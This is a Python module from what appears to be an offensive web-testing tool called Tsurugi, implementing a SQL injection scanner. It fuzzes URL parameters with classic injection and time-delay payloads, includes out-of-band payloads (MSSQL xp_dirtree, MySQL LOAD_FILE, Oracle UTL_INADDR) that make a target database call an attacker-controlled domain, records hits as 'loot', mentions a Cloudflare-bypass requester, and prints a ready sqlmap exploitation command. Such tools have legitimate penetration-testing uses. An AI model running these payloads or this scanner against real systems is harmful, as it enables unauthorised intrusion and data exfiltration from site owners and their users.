import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import TYPE_CHECKING
from rich.panel import Panel
from core.ui import console, log_info, log_error, log_warning
from core.logger import save_loot
from core.utils import load_payloads

if TYPE_CHECKING:
    from core.context import TsurugiContext

# Payloads leves para detecção rápida (Heurística)
SQL_ERRORS = {
    "MySQL": ["SQL syntax", "mysql_fetch", "check the manual that corresponds to your MySQL"],
    "PostgreSQL": ["PostgreSQL query failed", "unterminated quoted string", "syntax error at or near"],
    "MSSQL": ["Unclosed quotation mark", "SQL Server", "ODBC SQL Server Driver"],
    "Oracle": ["ORA-00933", "ORA-00936", "quoted string not properly terminated"]
}

PAYLOADS = load_payloads("sqli.txt", fallback=[
    "'", '"', "')", '")',
    "' OR '1'='1",
    "' AND SLEEP(5)--"
])

def run_sqli_scan(ctx: 'TsurugiContext', url: str) -> bool:
    """SQLi Scanner using TsurugiContext for proper config propagation."""
    console.print(f"\n[bold red][*] TSURUGI SQLi MODULE[/bold red] -> [yellow]{url}[/yellow]")

    # Use context's factory method - properly configures stealth, cf_bypass, etc
    requester = ctx.get_requester()

    # (Setup logic same as before)
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        log_error("No parameters found in URL.")
        return False

    log_info(f"Detected parameters: {list(params.keys())}")

    # Initialize Differential Response Engine
    from core.diff_engine import DiffEngine
    diff_engine = DiffEngine(length_threshold=30, time_threshold=2.0)

    # Baseline - also measure response time for dynamic time-based threshold
    baseline_time = 0
    try:
        start_time = time.time()
        base_resp = requester.get(url)
        baseline_time = time.time() - start_time
        if not base_resp: return False
        log_info(f"Baseline response time: {baseline_time:.2f}s")
        
        # Add baseline to diff engine for comparison
        diff_engine.add_baseline(base_resp, baseline_time)
    except Exception: return False
    
    # Dynamic threshold: baseline + (SLEEP_DELAY * factor)
    # Using 0.8 factor to account for network variance
    SLEEP_DELAY = 5  # seconds (matches payload)
    time_threshold = baseline_time + (SLEEP_DELAY * 0.8)
    
    detected = False
    
    # Merge OOB Payloads
    current_payloads = PAYLOADS.copy()
    oob_client = ctx.oob_client  # Get from context
    if oob_client and oob_client.registered:
        # SQLi OOB Payloads (Generic)
        # xp_dirtree is MSSQL, http_get is Oracle, etc.
        # Simple generic DNS exfiltration:
        d = oob_client.domain
        oob_sqli = [
            f"'; EXEC master..xp_dirtree '\\\\{d}\\a'--", # MSSQL
            f"' UNION SELECT 1,LOAD_FILE('\\\\\\\\{d}\\\\a'),3--", # MySQL Windows
            f"'; SELECT UTL_INADDR.GET_HOST_ADDRESS('{d}') FROM DUAL--", # Oracle
        ]
        console.print(f"[blue][*] OOB Mode Enabled: Adding Blind SQLi payloads for {d}[/blue]")
        current_payloads.extend(oob_sqli)

    # Fuzzing
    for param in params.keys():
        original_value = params[param][0]
        console.print(f"Testing parameter: [bold cyan]{param}[/bold cyan]")

        for payload in current_payloads:
            fuzzed_params = params.copy()
            fuzzed_params[param] = [original_value + payload]
            query_string = urlencode(fuzzed_params, doseq=True)
            fuzzed_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

            is_time_based = "SLEEP" in payload or "WAITFOR" in payload
            
            try:
                start_t = time.time()
                resp = requester.get(fuzzed_url)
                elapsed = time.time() - start_t
                
                # Check OOB first if applicable
                if oob_client and oob_client.registered and oob_client.domain in payload:
                     interactions = oob_client.poll()
                     if interactions:
                         console.print(Panel(
                            f"Payload: {payload}\nInteraction: {interactions}",
                            title=f"[!] OOB SQLi DETECTED ({param})",
                            border_style="red"
                        ))
                         detected = True
                         save_loot("sqli_blind", fuzzed_url, {"payload": payload, "interactions": interactions})
                         break
                
                if not resp: continue

                # A. Error Based
                for db, errors in SQL_ERRORS.items():
                    for err in errors:
                        if err in resp.text:
                            console.print(Panel(
                                f"Payload: {payload}\nDatabase: {db}\nError: {err}",
                                title=f"[!] SQL INJECTION CONFIRMED ({param})",
                                border_style="red"
                            ))
                            detected = True
                            save_loot("sqli", fuzzed_url, {"type": "error_based", "db": db, "payload": payload})
                            break
                
                # B. Time Based - using dynamic threshold
                if is_time_based and elapsed > time_threshold:
                    log_warning(f"Potential Time-Based delay ({elapsed:.2f}s > threshold {time_threshold:.2f}s). Verifying...")
                    control_payload = payload.replace("5", "0")
                    control_params = params.copy()
                    control_params[param] = [original_value + control_payload]
                    control_query = urlencode(control_params, doseq=True)
                    control_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, control_query, parsed.fragment))
                    
                    start_c = time.time()
                    resp_c = requester.get(control_url)
                    elapsed_c = time.time() - start_c
                    
                    if elapsed_c < 2:
                         console.print(Panel(
                            f"Payload: {payload}\nDelay: {elapsed:.2f}s\nControl: {elapsed_c:.2f}s",
                            title=f"[!] TIME-BASED SQLi CONFIRMED ({param})",
                            border_style="red"
                        ))
                         detected = True
                         save_loot("sqli", fuzzed_url, {"type": "time_based", "payload": payload})
                    else:
                        console.print(f"  [dim]False Positive: Server lag.[/dim]")
                
                # C. Differential Analysis (Boolean-based Blind)
                diff_result = diff_engine.compare(resp, elapsed)
                if diff_result.is_different and diff_result.confidence > 0.5:
                    # Potential boolean-based blind SQLi
                    console.print(Panel(
                        f"Payload: {payload}\nDifferences: {', '.join(diff_result.differences)}\nConfidence: {diff_result.confidence:.1%}",
                        title=f"[!] POTENTIAL BLIND SQLi ({param})",
                        border_style="yellow"
                    ))
                    save_loot("sqli", fuzzed_url, {
                        "type": "boolean_blind_potential",
                        "payload": payload,
                        "confidence": diff_result.confidence,
                        "differences": diff_result.differences
                    })

            except Exception as e:
                log_warning(f"Request error: {e}")

            if detected: break
        if detected: break

    if detected:
        console.print("\n[bold green][+] SUGGESTED EXPLOITATION:[/bold green]")
        console.print(f"sqlmap -u \"{url}\" --batch --dbs --level=5 --risk=3")
    else:
        console.print("\n[dim]No obvious SQLi vulnerabilities found.[/dim]")
    
    return detected
